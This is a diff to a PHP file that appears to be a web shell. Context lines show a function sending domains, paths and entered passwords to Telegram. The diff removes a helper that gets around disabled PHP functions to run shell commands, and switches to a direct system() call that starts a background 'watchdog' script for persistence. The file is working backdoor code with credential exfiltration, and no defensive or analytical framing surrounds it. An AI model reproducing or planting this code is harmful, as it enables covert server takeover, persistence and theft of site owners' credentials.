@@ -29,34 +29,7 @@ function sendTelegram($domain, $path, $file, $passwordInput) {
     curl_exec($ch);
     curl_close($ch);
 }
-function safe_system($cmd) {
-    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
-        ob_start();
-        system($cmd);
-        return ob_get_clean();
-    }
 
-    if (function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions')))) {
-        $descriptorspec = [
-            0 => ["pipe", "r"],  // stdin
-            1 => ["pipe", "w"],  // stdout
-            2 => ["pipe", "w"],  // stderr
-        ];
-
-        $process = proc_open($cmd, $descriptorspec, $pipes);
-        if (is_resource($process)) {
-            fclose($pipes[0]);
-            $output = stream_get_contents($pipes[1]);
-            $error = stream_get_contents($pipes[2]);
-            fclose($pipes[1]);
-            fclose($pipes[2]);
-            proc_close($process);
-            return $output . $error;
-        }
-    }
-
-    return "❌ Command execution not available.";
-}
 function safe_exec($cmd) {
     // shell_exec
     if (function_exists('shell_exec') && is_callable('shell_exec')) {
@@ -358,7 +331,7 @@ PHP;
     chmod($watchdog, 0755);
 
     // Jalankan watcher di background
-    safe_system("/usr/bin/php $watchdog > /dev/null 2>&1 &");
+    system("/usr/bin/php $watchdog > /dev/null 2>&1 &");
 
     header("Location: ?path=" . urlencode($dir));
     exit;
